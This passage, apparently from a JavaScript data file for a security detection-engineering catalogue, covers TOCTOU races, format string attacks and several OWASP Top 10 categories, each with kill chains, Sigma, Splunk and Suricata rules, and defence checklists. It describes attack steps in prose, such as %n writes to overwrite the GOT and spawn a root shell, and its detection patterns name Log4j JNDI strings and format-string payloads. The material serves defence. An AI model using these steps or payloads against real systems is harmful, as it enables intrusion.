        "Unusually high frequency of symlink and unlink system calls (thousands per second) from an unprivileged process",
        "High CPU utilization in unprivileged background threads running tight loops in /tmp",
        "Modification of critical system files (/etc/passwd, /etc/shadow) by unexpected background cron utilities"
      ]
    },
    rules: {
      sigma: `title: High Frequency Symlink Swapping Activity (Potential TOCTOU Race)
id: 9a3c2e18-64d9-4f23-9b51-8ef41b620082
status: stable
description: Detects rapid, high-volume symlink and unlink operations in temporary directories indicative of TOCTOU race condition attacks.
author: SOC Detection Engineering
logsource:
    product: linux
    service: auditd
detection:
    selection:
        syscall:
            - 'symlink'
            - 'symlinkat'
            - 'unlink'
            - 'unlinkat'
        name|contains:
            - '/tmp/'
            - '/var/tmp/'
            - '/dev/shm/'
    condition: selection
fields:
    - exe
    - syscall
    - name
    - auid
level: high
tags:
    - attack.privilege_escalation
    - attack.t1068`,
      splunk: `index=linux_audit (syscall=symlink OR syscall=symlinkat OR syscall=unlink) (name="/tmp/*" OR name="/var/tmp/*")
| stats count by exe, auid
| where count > 500
| eval Alert="HIGH: High-Frequency Symlink/Unlink Loop Detected (Potential TOCTOU Race Condition)"
| table _time, host, exe, auid, count, Alert`,
      suricata: `# Host-level rule:
alert tcp $HOME_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Sudden Modification of /etc/shadow File";
    flow:to_server,established;
    content:"/etc/shadow";
    classtype:bad-unknown;
    sid:1000082;
    rev:1;
)`,
      sysmon: `# Verify Linux kernel symlink and hardlink protections:
sysctl fs.protected_symlinks fs.protected_hardlinks`
    },
    defenseChecklist: [
      { id: "race_1", title: "Enable Linux Kernel Symlink Protection", tier: "Kernel Hardening", desc: "Ensure fs.protected_symlinks=1 and fs.protected_hardlinks=1 are set in /etc/sysctl.conf to prevent following symlinks in sticky world-writable directories." },
      { id: "race_2", title: "Adopt Atomic File Creation Primitives", tier: "Software Engineering", desc: "Use atomic file open flags (O_CREAT | O_EXCL) and openat() with file descriptors rather than file path strings." },
      { id: "race_3", title: "Eliminate Predictable /tmp File Paths", tier: "Code Quality", desc: "Replace static /tmp file paths with mkstemp() or mkdtemp() generating secure, unpredictable temporary directories." },
      { id: "race_4", title: "Deploy Filesystem Namespaces (PrivateTmp)", tier: "Systemd Hardening", desc: "Enable PrivateTmp=yes in systemd service units to provide isolated /tmp namespaces inaccessible to other local users." }
    ]
  },

  {
    num: 83,
    id: "format-string-attack",
    name: "OS Format String Attack (Arbitrary Memory Read/Write via printf Specifier Abuse)",
    shortName: "Format String Attack",
    moduleGroup: "os-spec",
    module: "Module 6: OS Specialized Attacks",
    category: "os-spec",
    severity: "critical",
    cvss: "9.2",
    mitre: "T1203, T1059, T1068",
    primaryTargets: "Native C/C++ Binaries, Formatted I/O Functions (printf, sprintf, syslog), Global Offset Table (GOT)",
    threatActors: "Exploit Developers, Reverse Engineers, Advanced APT Groups",
    summary: "A Format String Attack is a severe low-level memory vulnerability occurring when untrusted user input is passed directly as the format string argument to formatted I/O functions (e.g. printf(userInput) instead of printf(\"%s\", userInput)). Attackers provide crafted format specifiers such as %x and %s to dump stack memory (leaking sensitive pointers, Stack Canaries, and cryptographic keys), and utilize the %n specifier (which writes the count of printed characters to a pointer) to write arbitrary values to arbitrary memory locations, hijacking control flow.",
    killChain: [
      {
        step: 1,
        title: "Format String Vulnerability Probing",
        mitre: "T1595.002",
        desc: "Submitting format specifier sequences (%x.%x.%x.%x or %p.%p.%p.%p) into application input fields to check if hex memory values are reflected."
      },
      {
        step: 2,
        title: "Stack Offset Identification (Direct Parameter Access)",
        mitre: "T1203",
        desc: "Using positional arguments (%n$p) to locate the exact position where the user's input buffer resides on the program call stack."
      },
      {
        step: 3,
        title: "Information Disclosure & Memory Defense Leaking",
        mitre: "T1592",
        desc: "Reading stack values to leak the Stack Canary value, the base address of libc, and program code pointers to defeat ASLR."
      },
      {
        step: 4,
        title: "Target Write Address Selection (GOT / Return Pointer)",
        mitre: "T1068",
        desc: "Targeting a Global Offset Table (GOT) entry (e.g. puts@got) or the saved frame return address for execution redirection."
      },
      {
        step: 5,
        title: "Arbitrary Write Crafting with %n Specifier",
        mitre: "T1203",
        desc: "Calculating exact character counts and using %<value>c%<offset>$n (or %hn/%hhn for word/byte writes) to write the address of system() into GOT."
      },
      {
        step: 6,
        title: "Hijacked Function Invocation & Root Shell Spawn",
        mitre: "T1059.004",
        desc: "Triggering the overwritten function pointer; the program calls system('/bin/sh') instead of the legitimate logging function, granting root."
      }
    ],
    telemetry: {
      sources: [
        "Application Logs & Syslog (High occurrence of %x, %s, %p in web inputs or daemon logging)",
        "Linux Core Dumps / dmesg (Application crash with SIGSEGV due to invalid pointer dereference)",
        "Network IDS Logs (Payload signatures containing dense %x/%n specifier strings)",
        "EDR Memory Protection Logs (Abnormal overwrite of Global Offset Table segments)"
      ],
      anomalies: [
        "Inbound requests containing repetitive format string specifiers (e.g. %08x, %s, %n, %hn)",
        "Segmentation fault in libc functions like vfprintf, vsprintf, or syslog",
        "Sudden execution of /bin/sh by daemon processes immediately following formatted I/O calls"
      ]
    },
    rules: {
      sigma: `title: Inbound Network Payload Containing Format String Specifiers
id: 8b1c4e2a-73d8-4f90-8a19-4cb81b730083
status: stable
description: Detects incoming traffic containing multiple format string specifiers indicative of memory leak or format string exploitation.
author: SOC Detection Engineering
logsource:
    category: network
detection:
    selection:
        payload|contains:
            - '%x.%x.%x'
            - '%p.%p.%p'
            - '%08x'
            - '%s%s%s'
            - '%n'
    condition: selection
fields:
    - src_ip
    - dest_port
    - payload
level: high
tags:
    - attack.execution
    - attack.t1203`,
      splunk: `index=network_ids (payload="*%x.%x*" OR payload="*%p.%p*" OR payload="*%n*")
| eval Alert="HIGH: Format String Vulnerability Exploitation Pattern Detected"
| table _time, src_ip, dest_ip, dest_port, payload, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Format String Specifier Exploit Pattern in Network Stream";
    flow:to_server,established;
    content:"%x.%x.%x"; nocase;
    classtype:attempted-user;
    sid:1000083;
    rev:1;
)`,
      sysmon: `# Compile C test with format-security warning flags:
gcc -Wformat -Wformat-security -Werror=format-security -o test test.c`
    },
    defenseChecklist: [
      { id: "fmt_1", title: "Enforce -Wformat Compiler Warnings as Errors", tier: "Software Development", desc: "Mandate compiler flags '-Wformat -Wformat-security -Werror=format-security' in all CI/CD build pipelines to fail builds with raw printf(buf)." },
      { id: "fmt_2", title: "Enforce Full RELRO (Read-Only Relocations)", tier: "Build Hardening", desc: "Compile with '-Wl,-z,relro,-z,now' to make the Global Offset Table (GOT) completely read-only after program startup." },
      { id: "fmt_3", title: "Static Code Analysis (SAST)", tier: "AppSec", desc: "Incorporate Semgrep, SonarQube, or Coverity to automatically catch any printf, syslog, or sprintf invocations lacking static format specifiers." },
      { id: "fmt_4", title: "Never Pass User Input as Format String", tier: "Secure Coding", desc: "Always specify the format parameter explicitly (e.g. printf(\"%s\", userInput); syslog(LOG_INFO, \"%s\", message);)." }
    ]
  },
  // =========================================================================
  // MODULE 16: OWASP TOP 10 WEB APPLICATION ATTACKS (84 - 93)
  // =========================================================================
  {
    num: 84,
    id: "broken-access-control",
    name: "Broken Access Control",
    shortName: "Broken Access Control",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "critical",
    cvss: "9.1",
    mitre: "T1548, T1078, T1552",
    primaryTargets: "Web Applications, REST/GraphQL APIs, Administrative Endpoints, Tenant Portals",
    threatActors: "Financial Extortionists, Account Takeover Botnets, Malicious Insiders",
    summary: "Broken Access Control occurs when restrictions on what authenticated users are allowed to do are not properly enforced. Attackers can exploit these flaws to access unauthorized functionality or data, such as viewing other users' sensitive accounts, viewing sensitive files, modifying user permissions, or assuming administrative privileges. It includes Insecure Direct Object References (IDOR), missing function-level access control, CORS misconfigurations, and JWT token manipulation.",
    killChain: [
      {
        step: 1,
        title: "Endpoint & Parameter Enumeration",
        mitre: "T1595.002",
        desc: "Probing API endpoints, user ID parameters, and administrative URL routes using automated fuzzing tools like Burp Suite or ffuf."
      },
      {
        step: 2,
        title: "IDOR & Horizontal Boundary Bypass",
        mitre: "T1078",
        desc: "Altering user_id or account_id values in API requests to access and modify records belonging to other tenants without authorization checks."
      },
      {
        step: 3,
        title: "Vertical Privilege Escalation",
        mitre: "T1548",
        desc: "Directly invoking unlinked administrative endpoints (/admin/users, /api/v1/grant_role) or tampering with role claims inside JWT tokens."
      }
    ],
    telemetry: {
      sources: [
        "Web Server & API Gateway Access Logs (Nginx, Kong, AWS API Gateway)",
        "Application Authorization Audit Logs (RBAC/ABAC authorization denial events)",
        "WAF / Cloud Access Logs (Rapid iteration of sequential numeric resource identifiers)"
      ],
      anomalies: [
        "Single session token requesting hundreds of distinct user account records in rapid succession",
        "Requests to administrative URIs from non-privileged IP subnets or user roles",
        "Mismatched authorization context between JWT user ID claim and URI parameter payload"
      ]
    },
    rules: {
      sigma: `title: Potential IDOR Horizontal Privilege Escalation in API
id: b1c2d3e4-f5a6-7b8c-9d0e-1f2a3b4c5d6e
status: production
description: Detects rapid sequential iteration over user ID parameters indicative of Insecure Direct Object Reference (IDOR) exploitation.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains: '/api/v1/users/'
        sc-status: 200
    timeframe: 1m
    condition: selection | count(cs-uri-stem) by c-ip > 50
level: high
tags:
    - attack.privilege_escalation
    - attack.t1548`,
      splunk: `index=web_logs uri_path="/api/v1/users/*" status=200
| rex field=uri_path "/api/v1/users/(?<target_user>[^/]+)"
| stats dc(target_user) as distinct_users by client_ip, user_id
| where distinct_users > 20
| eval Alert="Critical: High Rate of Multi-User Object Access (Potential IDOR / Broken Access Control)"
| table client_ip, user_id, distinct_users, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Potential API IDOR / Access Control Violation Pattern";
    flow:to_server,established;
    content:"/api/"; http_uri;
    content:"user_id="; http_uri;
    classtype:web-application-attack;
    sid:1000084;
    rev:1;
)`,
      sysmon: `# Enforce automated API token permission validation in middleware
grep -rn "req.params.id" ./src/routes/ | grep -v "verifyOwnership"`
    },
    defenseChecklist: [
      { id: "bac_1", title: "Enforce Server-Side Ownership Validation", tier: "Application Logic", desc: "Never trust client-supplied IDs. Verify that the authenticated session owns the requested resource on every single database transaction." },
      { id: "bac_2", title: "Adopt Centralized ABAC / RBAC Middleware", tier: "Architecture", desc: "Enforce consistent role-based or attribute-based access control policies at the API gateway or application middleware layer." },
      { id: "bac_3", title: "Use Non-Sequential UUIDs for Resource Keys", tier: "Data Storage", desc: "Replace guessable auto-incrementing integer IDs with cryptographically random UUIDv4 or ULID identifiers." },
      { id: "bac_4", title: "Disable Directory Browsing & Enforce CORS Whitelist", tier: "Web Server", desc: "Ensure web server directory listing is disabled and CORS origin headers strictly validate allowable domains, rejecting wildcard origins." }
    ]
  },
  {
    num: 85,
    id: "cryptographic-failures",
    name: "Cryptographic Failures",
    shortName: "Cryptographic Failures",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "high",
    cvss: "8.2",
    mitre: "T1552.001, T1040, T1600",
    primaryTargets: "Data in Transit, Data at Rest, Session Tokens, Password Hashes, Payment Card Data (PCI-DSS)",
    threatActors: "Adversary-in-the-Middle (AiTM), Nation-State Intelligence, Ransomware Operators",
    summary: "Formerly known as Sensitive Data Exposure, Cryptographic Failures focus on failures related to cryptography which often lead to sensitive data exposure or system compromise. Common root causes include transmitting data in cleartext (HTTP, FTP, SMTP), utilizing legacy/broken cryptographic algorithms (MD5, SHA-1, RC4, DES), hardcoded secret keys in frontend scripts or repositories, and improper cryptographic salt generation allowing rainbow table cracking.",
    killChain: [
      {
        step: 1,
        title: "Cryptographic Protocol Fingerprinting",
        mitre: "T1595.002",
        desc: "Scanning transport protocols with SSLScan or TestSSL to identify weak ciphers (RC4, 3DES), deprecated TLS versions (SSL 3.0, TLS 1.0/1.1), or missing HSTS."
      },
      {
        step: 2,
        title: "Interception & Downgrade Attack",
        mitre: "T1557",
        desc: "Executing SSL stripping or adversary-in-the-middle attacks to downgrade TLS connections and intercept plaintext credentials and session cookies."
      },
      {
        step: 3,
        title: "Cryptographic Extraction & Hash Cracking",
        mitre: "T1110.002",
        desc: "Extracting unsalted MD5/SHA-1 password hashes or weak AES-ECB encrypted blobs and inverting them using GPU clusters."
      }
    ],
    telemetry: {
      sources: [
        "TLS Inspection Proxy & Load Balancer Logs (HAProxy, F5, Cloudflare TLS telemetry)",
        "Network Packet Analyzers (Zeek SSL/TLS anomaly logs, cleartext HTTP on non-standard ports)",
        "Source Code & Secrets Scanners (GitGuardian, Trufflehog, Semgrep secret detection)"
      ],
      anomalies: [
        "Outbound plaintext transmission of sensitive data fields (Credit card PANs, SSNs, passwords)",
        "Negotiation of deprecated TLS 1.0 / 1.1 or cipher suites utilizing CBC mode without Encrypt-then-MAC",
        "Presence of hardcoded symmetric encryption keys or private RSA keys in application commit history"
      ]
    },
    rules: {
      sigma: `title: Insecure Cleartext Protocol Transmission of Sensitive Data
id: c2d3e4f5-a6b7-8c9d-0e1f-2a3b4c5d6e7f
status: production
description: Detects sensitive authentication or payment keywords transmitted over unencrypted HTTP protocol sessions.
logsource:
    category: network_traffic
detection:
    selection:
        dest_port: 80
        payload|contains:
            - 'password='
            - 'passwd='
            - 'credit_card='
            - 'cvv='
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1552`,
      splunk: `index=network_monitor dest_port=80 (payload="*password*" OR payload="*Bearer *")
| stats count by src_ip, dest_ip, dest_port, payload
| eval Severity="HIGH", Issue="Plaintext Credential Transmission over Cleartext HTTP"
| table _time, src_ip, dest_ip, Issue, payload`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (
    msg:"SEC-ALERT Cleartext Transmission of Password Parameter over HTTP";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"password="; http_client_body;
    classtype:policy-violation;
    sid:1000085;
    rev:1;
)`,
      sysmon: `# Audit all web configs for TLS 1.2/1.3 enforcement and HSTS header
curl -I -s -k https://target-app.internal | grep -i "strict-transport-security"`
    },
    defenseChecklist: [
      { id: "crypto_1", title: "Mandate TLS 1.3 & Disable Deprecated Ciphers", tier: "Perimeter / Network", desc: "Enforce TLS 1.2+ exclusively (preferring TLS 1.3) with PFS ciphers (ECDHE-RSA-AES-GCM); disable SSLv3, TLS 1.0, TLS 1.1, and RC4/3DES." },
      { id: "crypto_2", title: "Enforce Strict HTTP Strict Transport Security (HSTS)", tier: "Web Server", desc: "Send 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' to prevent protocol downgrade and SSL stripping attacks." },
      { id: "crypto_3", title: "Use Argon2id or PBKDF2 with High Work Factors", tier: "Cryptography", desc: "Never use MD5, SHA-1, or plain SHA-256 for passwords. Use Argon2id, bcrypt (cost >= 12), or PBKDF2 with unique cryptographic salts." },
      { id: "crypto_4", title: "Hardware-Backed Key Management (HSM / KMS)", tier: "Cloud / Secrets", desc: "Store master cryptographic keys in hardware security modules (HSM) or cloud KMS with envelope encryption and automated annual rotation." }
    ]
  },
  {
    num: 86,
    id: "owasp-injection",
    name: "Injection (OWASP)",
    shortName: "OWASP Injection",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1190, T1059",
    primaryTargets: "SQL/NoSQL Interpreters, OS Shells, LDAP Directories, XML Parsers, Template Engines (SSTI)",
    threatActors: "APT Syndicates, Initial Access Brokers, Automated Vulnerability Scanners",
    summary: "Injection flaws occur when untrusted user-supplied data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. Encompasses SQL, NoSQL, OS Command Injection, Object-Relational Mapping (ORM) injection, LDAP injection, and Server-Side Template Injection (SSTI).",
    killChain: [
      {
        step: 1,
        title: "Input Boundary Probing",
        mitre: "T1595.002",
        desc: "Submitting special characters (', \", ;, |, `, ${{7*7}}, <!--#exec--) into input fields to identify interpreter reflection and syntax error breaks."
      },
      {
        step: 2,
        title: "Payload Construction & Syntax Smuggling",
        mitre: "T1190",
        desc: "Constructing syntax-valid escape sequences tailored to the interpreter (e.g. NoSQL $ne or ORM HQL injection) to subvert execution logic."
      },
      {
        step: 3,
        title: "Arbitrary Command Execution / Data Exfiltration",
        mitre: "T1059",
        desc: "Executing arbitrary database queries or spawning a reverse bash/PowerShell shell to establish persistence."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Firewall (WAF) Inspection Logs",
        "Application Runtimes & Error Logs (Uncaught SyntaxException, SQLGrammarException)",
        "System Process Creation Logs (Sysmon Event ID 1, Linux auditd execve)"
      ],
      anomalies: [
        "Spike in HTTP 500 errors containing interpreter stack traces or database driver keywords",
        "Web application process (www-data, nginx, w3wp.exe) spawning cmd.exe, powershell.exe, or /bin/sh",
        "Outbound network connections originating directly from the database or web application runtime"
      ]
    },
    rules: {
      sigma: `title: Web Application Spawning System Shell (Command Injection)
id: d3e4f5a6-b7c8-9d0e-1f2a-3b4c5d6e7f8a
status: production
description: Detects command injection where a web server process spawns an interactive shell interpreter.
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        ParentImage|endswith:
            - '/nginx'
            - '/apache2'
            - '/httpd'
            - '/php-fpm'
            - '/node'
        Image|endswith:
            - '/sh'
            - '/bash'
            - '/dash'
            - '/python'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059`,
      splunk: `index=sysmon (ParentImage="*w3wp.exe" OR ParentImage="*nginx.exe" OR ParentImage="*httpd.exe") (Image="*cmd.exe" OR Image="*powershell.exe")
| eval Alert="CRITICAL: Web Server Process Spawned Interactive Command Shell (Possible Injection)"
| table _time, host, ParentImage, Image, CommandLine, User, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Server-Side Template Injection (SSTI) Expression Probe";
    flow:to_server,established;
    content:"{{"; http_client_body;
    content:"}}"; http_client_body;
    pcre:"/\{\{\s*(\d+[\*\+\-\/]\d+|config|self|system)\s*\}\}/i";
    classtype:web-application-attack;
    sid:1000086;
    rev:1;
)`,
      sysmon: `# Monitor Linux auditd for suspicious child processes of web server:
auditctl -a always,exit -F arch=b64 -S execve -F ppid=$(pgrep apache2 | head -n 1) -k web_execve`
    },
    defenseChecklist: [
      { id: "inj_1", title: "Mandatory Parameterized Queries & ORM Prepared Statements", tier: "Application Logic", desc: "Never concatenate user input directly into SQL, NoSQL, or LDAP queries. Use strictly parameterized queries or safe ORM abstractions." },
      { id: "inj_2", title: "Avoid OS Command Execution Functions", tier: "Secure Coding", desc: "Eliminate calls to exec(), system(), popen(), or eval(). Use native runtime libraries (e.g. child_process.execFile with argument arrays) instead." },
      { id: "inj_3", title: "Sandboxed Template Rendering Engine", tier: "AppSec", desc: "Configure template engines (Jinja2, Thymeleaf, Handlebars) with strict sandboxing enabled, disabling reflection and arbitrary code evaluation." },
      { id: "inj_4", title: "Enforce Runtime Least Privilege & AppArmor / SELinux", tier: "OS Hardening", desc: "Run web processes under non-privileged service accounts without shell access (nologin) and confine with strict SELinux/AppArmor profiles." }
    ]
  },
  {
    num: 87,
    id: "insecure-design",
    name: "Insecure Design",
    shortName: "Insecure Design",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "high",
    cvss: "7.5",
    mitre: "T1565.001, T1078, T1499",
    primaryTargets: "Business Logic Workflows, Password Recovery Workflows, Financial Checkout, Multi-Tenant Architecture",
    threatActors: "Fraud Rings, Automated Scalping Bots, Competitor Espionage",
    summary: "Insecure Design represents a broad category of architectural weaknesses representing 'missing or ineffective control design'. A secure implementation cannot fix an insecure design. Examples include lack of business logic rate limiting (allowing credential stuffing or coupon hoarding), insecure password recovery flows answering predictable questions, unconstrained file upload destinations, and absent tenant isolation at the architectural blueprint stage.",
    killChain: [
      {
        step: 1,
        title: "Architectural Business Logic Mapping",
        mitre: "T1592",
        desc: "Mapping out application operational workflows (account creation, coupon application, password reset, checkout flows) to discover unmitigated assumptions."
      },
      {
        step: 2,
        title: "Workflow Automation & Boundary Abuse",
        mitre: "T1078",
        desc: "Using bot scripts to execute race conditions on discounts, scrape inventory reservations, or brute-force weak reset PINs without throttling."
      },
      {
        step: 3,
        title: "Business Logic Compromise & Fraud Execution",
        mitre: "T1565",
        desc: "Draining loyalty points, bypassing payment authorization steps, or creating unlimited trial accounts without email verification."
      }
    ],
    telemetry: {
      sources: [
        "Business Logic & Application Transaction Logs",
        "Bot Management Telemetry (Cloudflare Bot Management, AWS WAF Bot Control)",
        "Database Transaction Anomaly Audits"
      ],
      anomalies: [
        "Mass creation of user accounts from rotating IP ranges with identical registration timing profiles",
        "High volume of failed password reset PIN validations with no account lockouts",
        "Negative cart totals or rapid concurrent requests against promotional coupon endpoints"
      ]
    },
    rules: {
      sigma: `title: High Rate of Account Creation from Single Subnet
id: e4f5a6b7-c8d9-0e1f-2a3b-4c5d6e7f8a9b
status: production
description: Detects automated bot-driven account creation indicating business logic abuse and missing anti-automation controls.
logsource:
    category: webserver
detection:
    selection:
        cs-method: 'POST'
        cs-uri-stem: '/register'
        sc-status: 201
    timeframe: 5m
    condition: selection | count() by c-ip > 30
level: medium
tags:
    - attack.initial_access
    - attack.t1078`,
      splunk: `index=application_logs action="apply_coupon"
| stats count by session_id, user_id, coupon_code
| where count > 10
| eval Alert="Potential Business Logic Abuse: Concurrent Repeated Coupon Application"
| table _time, session_id, user_id, coupon_code, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Repeated Rapid Password Reset Attempts Against Single User";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/api/auth/reset-password"; http_uri;
    threshold: type both, track by_dst, count 10, seconds 60;
    classtype:suspicious-login;
    sid:1000087;
    rev:1;
)`,
      sysmon: `# Verify rate limit middleware is registered in express application
grep -rn "rateLimit" ./src/app.js`
    },
    defenseChecklist: [
      { id: "des_1", title: "Mandatory Threat Modeling in SDLC", tier: "Architecture", desc: "Integrate formal threat modeling (STRIDE, PASTA) into initial system design phases before any software engineering code is written." },
      { id: "des_2", title: "Enforce Business Logic Rate Limiting & CAPTCHA", tier: "Application", desc: "Deploy rate limiting, progressive delays, and cryptographic Proof-of-Work / CAPTCHA on all sensitive business workflows (registration, resets)." },
      { id: "des_3", title: "Secure Multi-Tenant Architectural Isolation", tier: "Data Tier", desc: "Enforce strict tenant data partitioning at the database or schema level, ensuring row-level security (RLS) is cryptographically or logically isolated." },
      { id: "des_4", title: "State Machine Validation & Transaction Mutexes", tier: "Application Logic", desc: "Implement strict state machine transitions and atomic database transactions (SELECT FOR UPDATE) to prevent race conditions in financial operations." }
    ]
  },
  {
    num: 88,
    id: "security-misconfiguration",
    name: "Security Misconfiguration",
    shortName: "Security Misconfiguration",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "high",
    cvss: "7.5",
    mitre: "T1078.001, T1190, T1592",
    primaryTargets: "Cloud Storage Buckets, Default Admin Consoles, Web Frameworks, Error Handlers, HTTP Headers",
    threatActors: "Automated Crawlers, Shodan/Censys Scanners, Opportunistic Attackers",
    summary: "Security Misconfiguration happens when security settings are defined, implemented, and maintained with defaults or insecure values. Examples include unpatched software, enabled unnecessary features or sample pages, default accounts and passwords unchanged, overly verbose error messages exposing stack traces and database versions, misconfigured CORS wildcard headers, and exposed cloud storage buckets allowing anonymous read/write access.",
    killChain: [
      {
        step: 1,
        title: "Automated Attack Surface Scanning",
        mitre: "T1595",
        desc: "Scanning external endpoints using Nuclei, Nikto, or Nmap to locate exposed debug panels (/actuator, /server-status, /.git) and default portals."
      },
      {
        step: 2,
        title: "Default Credential & Configuration Probing",
        mitre: "T1078.001",
        desc: "Attempting factory default credentials (admin/admin, tomcat/s3cret) on administrative dashboards or querying unauthenticated metrics."
      },
      {
        step: 3,
        title: "Information Harvesting & Administrative Takeover",
        mitre: "T1190",
        desc: "Downloading environment variables (.env files), dumping source code from exposed .git directories, or deploying malicious WAR files."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access Logs (Probes for /.env, /actuator/env, /phpinfo.php, /.git/HEAD)",
        "Cloud Provider IAM & Storage Audit Logs (AWS CloudTrail S3 PutBucketPolicy, GetObject anonymous)",
        "Container & Kubernetes Cluster Audits"
      ],
      anomalies: [
        "Bursts of HTTP 404/403 requests probing standard administrative and configuration paths",
        "Inbound connections to sensitive debugging ports (e.g. 5005, 8080, 9001) from external IP addresses",
        "Stack traces containing database connection strings or internal file system paths returned in HTTP 500 bodies"
      ]
    },
    rules: {
      sigma: `title: Access Probing for Exposed Sensitive Files (.env / .git)
id: f5a6b7c8-d9e0-1f2a-3b4c-5d6e7f8a9b0c
status: production
description: Detects scanning activity targeting exposed environment, configuration, and version control repositories.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains:
            - '/.env'
            - '/.git/'
            - '/actuator/'
            - '/wp-config.php'
            - '/phpinfo.php'
    condition: selection
level: medium
tags:
    - attack.discovery
    - attack.t1592`,
      splunk: `index=web_proxy (cs_uri_stem="*/.env" OR cs_uri_stem="*/.git/HEAD" OR cs_uri_stem="*/actuator/heapdump")
| stats count by c_ip, cs_uri_stem, sc_status
| eval Alert="CRITICAL: Exposure Probing of Environment Variables or Git Metadata"
| table _time, c_ip, cs_uri_stem, sc_status, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Request for Exposed Spring Boot Actuator Endpoint";
    flow:to_server,established;
    content:"/actuator/"; http_uri;
    classtype:attempted-recon;
    sid:1000088;
    rev:1;
)`,
      sysmon: `# Verify production nginx disables server tokens and sensitive dot-file access:
nginx -T | grep -E "server_tokens|location.*\\/\\."`
    },
    defenseChecklist: [
      { id: "mis_1", title: "Automated Golden Image & CIS Hardening", tier: "Infrastructure", desc: "Deploy servers using immutable golden images hardened according to Center for Internet Security (CIS) Benchmarks." },
      { id: "mis_2", title: "Disable Verbose Error Messages & Stack Traces", tier: "Application", desc: "Configure global exception handlers to return generic error messages to clients while logging full debug traces to secure backend SIEM." },
      { id: "mis_3", title: "Block Hidden Files & Development Endpoints", tier: "Web Server", desc: "Explicitly block client access to dot-files (.git, .env) and disable all debugging/actuator endpoints in production builds." },
      { id: "mis_4", title: "Enforce Strict Security Headers (CSP, X-Frame-Options)", tier: "HTTP Headers", desc: "Implement Content-Security-Policy (CSP), X-Frame-Options: DENY, X-Content-Type-Options: nosniff, and Referrer-Policy headers." }
    ]
  },
  {
    num: 89,
    id: "vulnerable-components",
    name: "Vulnerable and Outdated Components",
    shortName: "Vulnerable Components",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1195.002, T1190",
    primaryTargets: "Open Source Libraries, Node.js npm Packages, Java Maven Dependencies, Python PyPI, Web Middleware",
    threatActors: "Supply Chain Threat Actors, Ransomware Pre-Cursor Gangs, State-Sponsored APTs",
    summary: "Components such as libraries, frameworks, and other software modules run with the same privileges as the application itself. If a vulnerable component is exploited, it can facilitate serious data loss or server takeover. Famous examples include Log4Shell (CVE-2021-44228), Spring4Shell (CVE-2022-22965), and Equifax Apache Struts (CVE-2017-5638). Lack of Software Bill of Materials (SBOM) and continuous CVE vulnerability scanning leaves applications exposed for months.",
    killChain: [
      {
        step: 1,
        title: "Software Component Fingerprinting",
        mitre: "T1592.004",
        desc: "Analyzing HTTP response headers, favicon hashes, JavaScript bundle comments, and error messages to identify exact third-party library versions."
      },
      {
        step: 2,
        title: "Public CVE Weaponization",
        mitre: "T1190",
        desc: "Selecting an existing proof-of-concept exploit (e.g. JNDI lookup string for Log4j or crafted payload for Apache Struts) matching the target version."
      },
      {
        step: 3,
        title: "Remote Code Execution via Component",
        mitre: "T1059",
        desc: "Executing arbitrary shellcode through the vulnerable library to drop web shells and establish reverse command connections."
      }
    ],
    telemetry: {
      sources: [
        "Software Composition Analysis (SCA) Pipeline Telemetry (Snyk, Dependabot, OWASP Dependency-Check)",
        "WAF / Edge Signature Detection (Known CVE exploit patterns in User-Agent, URI, and headers)",
        "Endpoint Detection & Response (EDR process parentage analysis)"
      ],
      anomalies: [
        "Inbound requests containing JNDI/LDAP/RMI lookup strings (${jndi:ldap://...}) in arbitrary HTTP headers",
        "Sudden outbound network connections on LDAP (389), RMI (1099), or DNS ports initiated by Java processes",
        "Presence of unpatched critical CVEs in production dependency trees older than 30 days"
      ]
    },
    rules: {
      sigma: `title: Log4j Remote JNDI Lookup Attempt in Web Request
id: a6b7c8d9-e0f1-2a3b-4c5d-6e7f8a9b0c1d
status: production
description: Detects generic Log4j exploitation payloads (CVE-2021-44228) attempting JNDI protocol injection.
logsource:
    category: webserver
detection:
    selection:
        payload|contains:
            - '\${jndi:ldap:/'
            - '\${jndi:rmi:/'
            - '\${jndi:dns:/'
            - '\${jndi:iiop:/'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=waf (payload="*\${jndi:*" OR payload="*class.module.classLoader*")
| eval CVE=if(like(payload, "%\${jndi:%"), "CVE-2021-44228 (Log4Shell)", "CVE-2022-22965 (Spring4Shell)")
| stats count by src_ip, dest_ip, CVE, payload
| table _time, src_ip, dest_ip, CVE, count, payload`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
